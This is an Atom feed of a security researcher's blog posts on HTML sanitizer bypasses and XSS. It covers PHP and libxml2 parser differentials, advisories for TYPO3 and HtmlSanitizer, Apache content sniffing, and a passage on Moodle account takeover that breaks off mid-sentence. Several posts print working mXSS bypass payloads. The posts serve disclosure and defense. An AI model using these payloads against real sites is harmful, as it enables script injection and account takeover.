<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yaniv Nizry Blogs</title>
  
  
  <link href="https://yaniv-git.github.io/atom.xml" rel="self"/>
  
  <link href="https://yaniv-git.github.io/"/>
  <updated>2023-12-03T11:51:13.869Z</updated>
  <id>https://yaniv-git.github.io/</id>
  
  <author>
    <name>Yaniv Nizry</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP HTML parser differential due to libxml2 lack of HTML5 support</title>
    <link href="https://yaniv-git.github.io/2023/11/28/PHP%20HTML%20parser%20differential%20due%20to%20libxml2%20lack%20of%20HTML5%20support/"/>
    <id>https://yaniv-git.github.io/2023/11/28/PHP%20HTML%20parser%20differential%20due%20to%20libxml2%20lack%20of%20HTML5%20support/</id>
    <published>2023-11-28T23:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>The default HTML parser of PHP uses the underlying package libxml2 (<a href="https://github.com/php/php-src/blob/master/ext/dom/document.c#L1920">for example here</a>). Libxml2 doesn’t <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/211">currently support</a> HTML5 parsing, and while it is undergoing process, after contacting them about this matter they said it will take a while before implementing this feature. This means that the built-in HTML parser of PHP behind <a href="https://www.php.net/manual/en/domdocument.loadhtml.php">loadHTML</a>, <a href="https://www.php.net/manual/en/class.domimplementation.php">DOMImplementation</a>, etc. does not follow the same parsing rules as modern web browsers.<br>This behaviour becomes security-relevant when HTML sanitizers use the built-in HTML parser.<br>We have come across multiple PHP sanitizers that are vulnerable to bypasses due to using the built-in parser, and we think that the root cause can’t be addressed without significant changes by libxml2.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>Here are some examples of how attackers can leverage these parsing differentials in order to bypass sanitizers.</p><h4 id="1-Comments"><a href="#1-Comments" class="headerlink" title="1. Comments:"></a>1. Comments:</h4><p>According to the <a href="https://www.w3.org/TR/xml/#sec-comments">XML specification</a> (XHTML), comments must end with the characters <code>—&gt;</code>. On the other hand, the <a href="https://html.spec.whatwg.org/multipage/syntax.html#comments">HTML specification</a> states that a comment’s text “must not start with the string <code>&gt;</code>, nor start with the string <code>-&gt;</code>”.<br>When parsing the following string in a browser, the comment will end before the <code>p</code> tag. But when parsing with PHP the <code>p</code> tag will be considered <code>a</code> comment:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &lt;!--&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">Browser (HTML specification) output: <span class="comment">&lt;!----&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">PHP parser (XHTML specification) output: <span class="comment">&lt;!--&gt;</span></span><span class="language-xml"><span class="comment">&lt;p&gt;--&gt;</span></span></span><br></pre></td></tr></table></figure><p>This can be done with either <code>&lt;!--&gt;</code> or <code>&lt;!---&gt;</code>.<br>An attacker can input the following payload <code>&lt;!--&gt;&lt;xss&gt;--&gt;</code>. While the parser considers the xss tag as a comment, the browser will end the comment right before and render the xss tag as expected.</p><h4 id="2-RCDATA-RAWTEXT-elements"><a href="#2-RCDATA-RAWTEXT-elements" class="headerlink" title="2. RCDATA&#x2F;RAWTEXT elements"></a>2. RCDATA&#x2F;RAWTEXT elements</h4><p>In <a href="https://html.spec.whatwg.org/#parsing-html-fragments">HTML5</a>, other element parsing types were introduced: </p><ul><li>RCDATA<ul><li>textarea</li><li>title</li></ul></li><li>RAWTEXT<ul><li>noframes</li><li>noembed</li><li>iframe</li><li>xmp</li><li>style</li></ul></li><li>OTHERS<ul><li>noscript - depends if <a href="https://html.spec.whatwg.org/#the-noscript-element">scripting</a> is enabled (enabled by default in browsers).</li><li>plaintext</li><li>script</li></ul></li></ul><p>While the PHP’s parser is oblivious to that. There are multiple ways an attacker can bypass a sanitizer due to wrong parsing such as:</p><ul><li><code>&lt;iframe&gt;&lt;!--&lt;/iframe&gt;&lt;xss&gt;--&gt;&lt;/iframe&gt;</code></li><li><code>&lt;noframes&gt;&lt;style&gt;&lt;/noframes&gt;&lt;xss&gt;&lt;/style&gt;&lt;/noframes&gt;</code></li><li>…</li></ul><h4 id="3-Foreign-content-elements"><a href="#3-Foreign-content-elements" class="headerlink" title="3. Foreign content elements"></a>3. Foreign content elements</h4><p>HTML5 introduced two foreign elements (<a href="https://html.spec.whatwg.org/#mathml">math</a> and <a href="https://html.spec.whatwg.org/#svg-0">svg</a>) which follow different parsing specifications than HTML. Again parsing with PHP doesn’t take it into account, causing other parsing differentials and sanitizers bypass such as:</p><ul><li><code>&lt;svg&gt;&lt;p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;xss&gt;--&gt;&lt;/style&gt;</code> </li><li>…</li></ul><h4 id="4-DOCTYPE-element"><a href="#4-DOCTYPE-element" class="headerlink" title="4. DOCTYPE element"></a>4. DOCTYPE element</h4><p>The <code>!DOCTYPE</code> <a href="https://www.w3.org/TR/xml/#NT-doctypedecl">element in XML&#x2F;XHTML</a> is more complex allowing more characters and element nesting than in <a href="https://html.spec.whatwg.org/#the-doctype">HTML5</a>. In contrast, the HTML doctype ends with the <a href="https://html.spec.whatwg.org/#doctype-state">first occurrence</a> of the “greater than” sign <code>&gt;</code>.<br>Parsing the following string will render an xss tag in the browser but not in PHP:</p><ul><li><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTDHTML4.01//EN&quot; &quot;&gt;&lt;xss&gt;&quot;&gt;</code> </li><li><code>&lt;!DOCTYPE HTML SYSTEM &quot;&gt;&lt;xss&gt;&quot;&gt;</code></li></ul><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>Sanitizers using the built-in PHP parser are inherently vulnerable to bypass due to wrong parsing.</p><h3 id="Recommendation"><a href="#Recommendation" class="headerlink" title="Recommendation"></a>Recommendation</h3><p>This issue is <a href="https://wiki.php.net/rfc/domdocument_html5_parser">known</a> but isn’t clear for users of PHP, after this report the PHP team added a red warning to the documentation:</p><ul><li><a href="https://www.php.net/manual/en/domdocument.loadhtml.php">loadhtml</a></li><li><a href="https://www.php.net/manual/en/domdocument.loadhtmlfile.php">loadhtmlfile</a></li><li><a href="https://github.com/php/doc-en/commit/4ef716f8aa753e1189b2e57c91da378b16d970b0">Commit</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;The default HTML parser of PHP uses the underlying</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
    <category term="parser differential" scheme="https://yaniv-git.github.io/tags/parser-differential/"/>
    
  </entry>
  
  <entry>
    <title>Masterminds/html5-php parser differential</title>
    <link href="https://yaniv-git.github.io/2023/11/13/Masterminds%20html5-php%20parser%20differential/"/>
    <id>https://yaniv-git.github.io/2023/11/13/Masterminds%20html5-php%20parser%20differential/</id>
    <published>2023-11-13T23:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><p>We have noticed a number of parsing differences between the Masterminds&#x2F;html5-php parser and the HTML5 specification. We think that the root cause of those issues drills down to the <a href="https://github.com/Masterminds/html5-php/blob/master/src/HTML5/Parser/DOMTreeBuilder.php#L172">use</a> of PHP’s default parser, <a href="https://www.php.net/manual/en/domdocument.loadhtml.php">loadHTML</a>, <a href="https://www.php.net/manual/en/class.domimplementation.php">DOMImplementation</a>, etc. The lack of HTML5 support by PHP is <a href="https://wiki.php.net/rfc/domdocument_html5_parser">known</a> and we contacted them asking to make it more clear in the <a href="https://www.php.net/manual/en/domdocument.loadhtml.php">documentation</a> in order to raise awareness for these security issues.<br>This behavior becomes security-relevant when HTML sanitizers use the Masterminds&#x2F;html5-php parser. We have come across multiple PHP sanitizers that are vulnerable to bypasses due to using Masterminds&#x2F;html5-php.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Here are examples of the differentials, and how attackers can leverage these in order to bypass sanitizers.</p><h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments:"></a>Comments:</h3><p>According to the <a href="https://www.w3.org/TR/xml/#sec-comments">XML specification</a> (XHTML), comments must end with the characters <code>--&gt;</code>.<br>On the other hand, the <a href="https://html.spec.whatwg.org/multipage/syntax.html#comments">HTML specification</a> states that a comment’s text <em>‘must not start with the string <code>&gt;</code>, nor start with the string <code>-&gt;</code>‘</em>.<br>When parsing the following string in a browser, the comment will end before the <code>p</code> tag. But when parsing with <code>Masterminds/html5-php</code> the <code>p</code> tag will be considered a comment:</p><ul><li>Input: <code>&lt;!---&gt;&lt;p&gt;</code></li><li>Browser (HTML5 specification) output: <code>&lt;!----&gt;&lt;p&gt;&lt;/p&gt;</code></li><li>Masterminds&#x2F;html5-php parser output: <code>&lt;!---&gt;&lt;p&gt;--&gt;</code></li></ul><p>An attacker can input the following payload <code>&lt;!---&gt;&lt;xss&gt;--&gt;</code>. While the parser considers the <code>xss</code> tag as a comment, the browser will end the comment right before and render the <code>xss</code> tag as expected.</p><h3 id="Processing-instructions-PI-elements-known-but-we-encounter-sanitizer-bypasses-due-to-this"><a href="#Processing-instructions-PI-elements-known-but-we-encounter-sanitizer-bypasses-due-to-this" class="headerlink" title="Processing instructions (PI) elements (known, but we encounter sanitizer bypasses due to this)"></a>Processing instructions (PI) elements (<a href="https://github.com/Masterminds/html5-php#known-issues-or-things-we-designed-against-the-spec">known</a>, but we encounter sanitizer bypasses due to this)</h3><p>Processing instructions elements exist in <a href="https://www.w3.org/TR/xml/#sec-pi">XML specification</a> but in <a href="https://html.spec.whatwg.org/#determining-the-character-encoding:~:text=A%20sequence%20of%20bytes%20starting%20with%3A%200x3C%200x3F%20(%60%3C%3F%60)">HTML5</a> the characters <code>&lt;?</code> opens a comment and ends it at the first occurrence of greater than <code>&gt;</code>.</p><p>Attackers can create the following Processing Instruction <code>&lt;?xml &gt;s&lt;img src=x onerror=alert(1)&gt; ?&gt;</code> and while no <code>img</code> tag is rendered in Masterminds&#x2F;html5-php the browser will create a comment and end it at the first <code>&gt;</code> character, rendering the <code>img</code> tag.</p><h3 id="Foreign-content-elements"><a href="#Foreign-content-elements" class="headerlink" title="Foreign content elements"></a>Foreign content elements</h3><p>HTML5 introduced two foreign elements (<a href="https://html.spec.whatwg.org/#mathml">math</a> and <a href="https://html.spec.whatwg.org/#svg-0">svg</a>) which follow different parsing specifications than HTML. Masterminds&#x2F;html5-php doesn’t take it into account, causing other parsing differentials and <a href="https://research.securitum.com/dompurify-bypass-using-mxss/">sanitizers bypass</a> such as:</p><ul><li><code>&lt;svg&gt;&lt;p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;xss&gt;--&gt;&lt;/style&gt;</code></li></ul><h3 id="noscript-element"><a href="#noscript-element" class="headerlink" title="noscript element"></a><code>noscript</code> element</h3><p>Depending if <a href="https://html.spec.whatwg.org/#the-noscript-element">scripting</a> is enabled (enabled by default in browsers) the <code>noscript</code> element parses its content differently:</p><ul><li>If scripting is enabled, then the content is rendered as raw data</li><li>If scripting is disabled, then the content is rendered as HTML</li></ul><p>Masterminds&#x2F;html5-php parses according to disabled scripting, which is different than the default browsers’ parsing.<br>This is not wrong per se, but still can cause some <a href="https://cure53.de/fp170.pdf">mXSS</a> such as:<br><code>&lt;noscript&gt;&lt;p alt=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Observations&quot;&gt;&lt;a href=&quot;#Observations&quot; class=&quot;headerlink&quot; title=&quot;Observations&quot;&gt;&lt;/a&gt;Observations&lt;/h2&gt;&lt;p&gt;We have noticed a number of pa</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
    <category term="parser differential" scheme="https://yaniv-git.github.io/tags/parser-differential/"/>
    
  </entry>
  
  <entry>
    <title>Typo3 HTML Sanitizer By-passing via the processing instructions</title>
    <link href="https://yaniv-git.github.io/2023/11/13/Typo3%20HTML%20Sanitizer%20By-passing%20via%20the%20processing%20instructions/"/>
    <id>https://yaniv-git.github.io/2023/11/13/Typo3%20HTML%20Sanitizer%20By-passing%20via%20the%20processing%20instructions/</id>
    <published>2023-11-13T23:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>DOM processing instructions are not handled correctly. This allows bypassing the cross-site scripting mechanism of <a href="https://packagist.org/packages/typo3/html-sanitizer">typo3&#x2F;html-sanitizer</a>.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>Update to <code>typo3/html-sanitizer</code> versions 1.5.3 or 2.1.4 that fix the problem described.</p><h1 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h1><p>Thanks to Yaniv Nizry and Niels Dossche who reported this issue, and to TYPO3 core &amp; security team member Oliver Hader who fixed the issue.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://typo3.org/security/advisory/typo3-core-sa-2023-007">TYPO3-CORE-SA-2023-007</a></li><li><a href="https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-652v-xw37-rvw7">Disclosure &amp; PoC</a> (embargoed +90 days)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Problem&quot;&gt;&lt;a href=&quot;#Problem&quot; class=&quot;headerlink&quot; title=&quot;Problem&quot;&gt;&lt;/a&gt;Problem&lt;/h1&gt;&lt;p&gt;DOM processing instructions are not handled correc</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Apache httpd Stored XSS by design</title>
    <link href="https://yaniv-git.github.io/2023/11/04/Apache%20httpd%20XSS%20by%20design/"/>
    <id>https://yaniv-git.github.io/2023/11/04/Apache%20httpd%20XSS%20by%20design/</id>
    <published>2023-11-04T23:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Approximately one year ago in 2022, I took part in a Capture The Flag (CTF) challenge with the objective of achieving Remote Code Execution (RCE). While tackling the challenge, I observed an unusual behavior that allowed for a Stored Cross-Site Scripting (XSS) attack by uploading a file, regardless of its extension. Upon closer investigation, I uncovered that the <em>“quirk”</em> was rooted in the Apache HTTP Server.</p><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>By default, Apache httpd does not include the “no-sniff” header, <code>X-Content-Type-Options: nosniff</code>, and it does not perform automatic content type detection for files that lack a name or have only dots as their name, regardless of the file extension. For instance, a file named <code>.jpg</code> or <code>...jpg</code> would serve without any content type causing the browser to <em>“sniff”</em> the content, unlike files such as <code>test.jpg</code> which will result in <code>Content-type: image/jpeg</code>. This means that if an attacker has the capability to upload a file with no name or a name consisting solely of dots, it becomes possible to exploit a stored XSS vulnerability, regardless of the file extension’s constraints.</p><img src="/img/blogs/httpd/Image-1.png" style="width: 100%;"/><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><h2 id="Content-type"><a href="#Content-type" class="headerlink" title="Content-type"></a>Content-type</h2><p>In HTTP (Hypertext Transfer Protocol), the <code>Content-Type</code> header is used to indicate the media type or MIME (Multipurpose Internet Mail Extensions) type of the data that is being sent in the HTTP response. It specifies the format of the content being returned by the server so that the client (e.g., a web browser) knows how to properly interpret and display the data.</p><p>Here are some examples of common media types:</p><ul><li><code>text/html</code>: Indicates that the content is HTML text.</li><li><code>text/plain</code>: Indicates that the content is plain text.</li><li><code>application/json</code>: Indicates that the content is JSON data.</li><li><code>application/xml</code>: Indicates that the content is XML data.</li><li><code>image/jpeg</code>, <code>image/png</code>, <code>image/gif</code>: Indicate that the content is an image in various formats.</li></ul><p>This header is crucial for the client to interpret the received data correctly. If the client doesn’t recognize or support the specified Content-Type, it may not be able to process the content as intended.</p><h2 id="Content-type-Sniffing"><a href="#Content-type-Sniffing" class="headerlink" title="Content-type Sniffing"></a>Content-type Sniffing</h2><p>Content-Type sniffing, is a behavior that web browsers and other user agents sometimes exhibit when they receive a resource with an ambiguous or missing Content-Type header. Content-Type sniffing involves the user agent trying to determine the media type of the resource by inspecting its actual content. </p><p>The purpose of content-type sniffing is to improve the user experience by attempting to render the content in a way that makes sense to the user. However, it can also introduce security risks. For example, if an attacker can control the content of a resource and trick the browser into interpreting it as a different media type, and might lead to security vulnerabilities.</p><p>To mitigate these risks, modern browsers provide web developers the ability to to disable content sniffing by adding the header: <code>X-Content-Type-Options: nosniff</code>.</p><p>Content-Type sniffing should not be relied upon for determining the media type of a resource. Instead, it’s best practice to always set the correct Content-Type header on the server side to ensure that the browser and other user agents can correctly process the content.</p><h1 id="Apache’s-response"><a href="#Apache’s-response" class="headerlink" title="Apache’s response"></a>Apache’s response</h1><p>After reaching the maintainers of Apache httpd, they replied that this is the expected behavior of <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a> (the component that generates a content-type according to a file).</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options">X-Content-Type-Options</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type">Content-Type</a></li><li><a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a></li><li><a href="https://twitter.com/YNizry/status/1582733545759330306">Tweet</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Approximately one year ago in </summary>
      
    
    
    
    
    <category term="content-type" scheme="https://yaniv-git.github.io/tags/content-type/"/>
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="apache" scheme="https://yaniv-git.github.io/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>HtmlSanitizer vulnerable to Cross-site Scripting in Foreign Content</title>
    <link href="https://yaniv-git.github.io/2023/10/03/HtmlSanitizer%20vulnerable%20to%20Cross-site%20Scripting%20in%20Foreign%20Content/"/>
    <id>https://yaniv-git.github.io/2023/10/03/HtmlSanitizer%20vulnerable%20to%20Cross-site%20Scripting%20in%20Foreign%20Content/</id>
    <published>2023-10-03T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>The vulnerability occurs in configurations where foreign content is allowed, i.e. either <code>svg</code> or <code>math</code> are in the list of allowed elements.<br>Specifically, the requirements for the vulnerability are:</p><ol><li>Allowing one foreign element: <code>svg</code>, or <code>math</code></li><li>Comments or one raw text element: <code>iframe</code>, <code>noembed</code>, <code>xmp</code>, <code>title</code>, <code>noframes</code>, <code>style</code> or <code>noscript</code></li></ol><p>Configurations that meet the above requirements plus the following are vulnerable to an additional vulnerability:</p><ul><li>Any HTML integration element: <code>title</code>, <code>desc</code>, <code>mi</code>, <code>mo</code>, <code>mn</code>, <code>ms</code>, <code>mtext</code>, <code>annotation-xml</code>.</li></ul><p>In case an application sanitizes user input with a vulnerable configuration, an attacker could<br>bypass the sanitization and inject arbitrary HTML, including JavaScript code.</p><p>Note that in the default configuration the vulnerability is not present.</p><h1 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h1><p>The vulnerability has been fixed in versions 8.0.723 and 8.1.722-beta (preview version).</p><h1 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h1><p>Disallow foreign elements <code>svg</code> and <code>math</code>. This is the case in the default configuration, which is therefore not affected by the vulnerability.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://github.com/mganss/HtmlSanitizer/security/advisories/GHSA-43cp-6p3q-2pc4">GHSA-43cp-6p3q-2pc4</a></li><li><a href="https://github.com/mganss/HtmlSanitizer/commit/ab29319866c020f0cc11e6b92228cd8039196c6e">mganss&#x2F;HtmlSanitizer@ab29319</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-44390">https://nvd.nist.gov/vuln/detail/CVE-2023-44390</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Impact&quot;&gt;&lt;a href=&quot;#Impact&quot; class=&quot;headerlink&quot; title=&quot;Impact&quot;&gt;&lt;/a&gt;Impact&lt;/h1&gt;&lt;p&gt;The vulnerability occurs in configurations where forei</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Playing Dominos with Moodle&#39;s Security (2/2)</title>
    <link href="https://yaniv-git.github.io/2023/08/28/Playing%20Dominos%20with%20Moodle&#39;s%20Security%202/"/>
    <id>https://yaniv-git.github.io/2023/08/28/Playing%20Dominos%20with%20Moodle&#39;s%20Security%202/</id>
    <published>2023-08-28T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In our endeavor to enhance the security of the open-source realm and gain a deeper understanding of real-world vulnerabilities, we are constantly conducting audits of open-source projects, and the outcomes of this are presented in our two articles on Moodle security. This is the second blog covering another critical finding we discovered when auditing Moodle for security vulnerabilities. </p><p>In the first blog, we demonstrated how an unauthorized attacker could turn an arbitrary folder creation into a Cross-Site Scripting (XSS) vulnerability, ultimately resulting in Remote Code Execution (RCE). The second part of the series follows the same line of starting with a considerably low-impact bug at first glance, but with some steps, attackers can leverage it to a full account takeover. </p><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Moodle versions before 4.2.2, 4.1.5, 4.0.10, 3.11.16, and 3.9.23 are susceptible to Account Takeover (ATO) via self-XSS in the WYSIWYG editor – this is tracked as CVE-2023-40320. On Moodle instances where <a href="https://en.wikipedia.org/wiki/OAuth">OAuth</a> authentication is enabled, victims’ accounts can be compromised with a simple click on a link.</p><iframe width="100%" height="414" src="https://www.youtube.com/embed/njeXbu85yzM" title="Demonstration of Moodle vulnerabilities (CVE-2023-40320) on a test instance" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>In this section, we will discuss the technical details of the vulnerability and explain how attackers might exploit this kind of vulnerability.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>A self-XSS vulnerability is when an attacker can execute arbitrary JavaScript code but the only one being affected by it is the attacker itself. To exploit this type of XSS, an attacker usually would need a high level of victim interaction, such as copying and pasting the payload to the vulnerable website. In many cases, this issue would not be considered a vulnerability, and even in the case of the Moodle vulnerability disclosure program, self-XSS is <a href="https://moodle.org/mod/page/view.php?id=8722#:~:text=Self%2DXSS%20(unless%20there%20is%20a%20proven%20impact%20on%20other%20users)">out of scope</a> <strong>“(unless there is a proven impact on other users).”</strong></p><h1 id="From-Self-XSS-to-Account-Takeover-CVE-2023-40320"><a href="#From-Self-XSS-to-Account-Takeover-CVE-2023-40320" class="headerlink" title="From Self-XSS to Account Takeover (CVE-2023-40320)"></a>From Self-XSS to Account Takeover (CVE-2023-40320)</h1><p>One of the initial steps we do when auditing an application is to use it as intended. Doing so helps us understand how it is supposed to behave and also brings many ideas to mind on how to manipulate the intended behavior the same way an attacker would. Pretty quickly we ran into the WYSIWYG editor in Moodle. </p><p>Being one of the core features of Moodle, it appears when editing a description of a user, writing an answer to a forum, submitting assignments, and many more.</p><p>We noticed that there is the possibility to input arbitrary HTML which will be rendered and executed in the editor (making this a self-XSS). But when submitting the payload to a public page (such as a forum, assignment, etc.), it gets sanitized on the server side and dangerous elements are removed – other users will never be affected by the payload. </p><img src="/img/blogs/Moodle/image-2.webp" style="width: 100%;"/><p>In addition, the editor has a feature that automatically saves a user’s WYSIWYG content by sending the unsanitized data periodically after a couple of seconds to the <code>/lib/editor/atto/autosave-ajax.php</code> endpoint:</p><img src="/img/blogs/Moodle/image-3.webp" style="width: 100%;"/><p>When loading the page again, the autosaved data is fetched from the same endpoint using the <code>actions[0][action]</code> parameter set to <code>resume</code>. In case a malicious payload was stored before, it will execute again by visiting the WYSIWYG page – this just became a Stored Self-XSS!</p><h1 id="Exploitation-strategies"><a href="#Exploitation-strategies" class="headerlink" title="Exploitation strategies"></a>Exploitation strategies</h1><p>One of the ways an attacker could leverage this type of bug to an impactful one is by manipulating a victim into logging in to a malicious account -&gt; triggering the self-XSS -&gt; raising the impact depending on the application. With it, this was the first exploitation idea we tested. After a small check, we saw that the login and logout features are CSRF-protected, meaning an attacker can’t log in or out on the victim’s behalf by manipulating them to visit a malicious website. </p><p>In this case, an attacker needs to find some kind of “magic link” (a single link that logs in a user without a password, usually using a one-time token). The first idea we wanted to test is via an OAuth login. Yet again this endpoint was protected by a GET parameter <code>sesskey</code> which acts as a CSRF token. At this point, we decided that code auditing would yield better results than quick tests. </p><p>Following the normal login procedure, the function that logs in a user is called <code>complete_user_login</code>. This function is called after the authentication is verified and would also log out the current user if there is one. Upon examining all the calls made to this function, we discovered several endpoints. However, we observed that they either verifying new accounts (Moodle accounts must be verified before users can access them, meaning an attacker can’t pre-deploy the self-XSS) or prohibited logging in if a session already existed. Changing the email of an existing account would send a confirmation message but the link provided only confirms and does not login, unlike the confirmation link when registering a new account.</p><h1 id="OAuth-Authentication-Flows"><a href="#OAuth-Authentication-Flows" class="headerlink" title="OAuth Authentication Flows"></a>OAuth Authentication Flows</h1><p>But then we came across <code>auth/oauth2/confirm-linkedlogin.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">required_param</span>(<span class="string">&#x27;token&#x27;</span>, PARAM_RAW);</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">required_param</span>(<span class="string">&#x27;username&#x27;</span>, PARAM_USERNAME);</span><br><span class="line"><span class="variable">$userid</span> = <span class="title function_ invoke__">required_param</span>(<span class="string">&#x27;userid&#x27;</span>, PARAM_INT);</span><br><span class="line"><span class="variable">$issuerid</span> = <span class="title function_ invoke__">required_param</span>(<span class="string">&#x27;issuerid&#x27;</span>, PARAM_INT);</span><br><span class="line"><span class="variable">$redirect</span> = <span class="title function_ invoke__">optional_param</span>(<span class="string">&#x27;redirect&#x27;</span>, <span class="string">&#x27;&#x27;</span>, PARAM_LOCALURL);    <span class="comment">// Where to </span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable">$confirmed</span> = \auth_oauth2\api::<span class="title function_ invoke__">confirm_link_login</span>(<span class="variable">$userid</span>, <span class="variable">$username</span>, <span class="variable">$issuerid</span>, <span class="variable">$token</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$confirmed</span>) &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$user</span>-&gt;suspended) &#123;</span><br><span class="line">       <span class="title function_ invoke__">complete_user_login</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$redirect</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">redirect</span>(<span class="variable">$redirect</span>);</span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>Here, if the link is valid, a login will happen. Without any verification that another user is already logged in, this is the only endpoint that does that. In addition to that, there is the possibility to pass a local <code>$redirect</code> URL that will 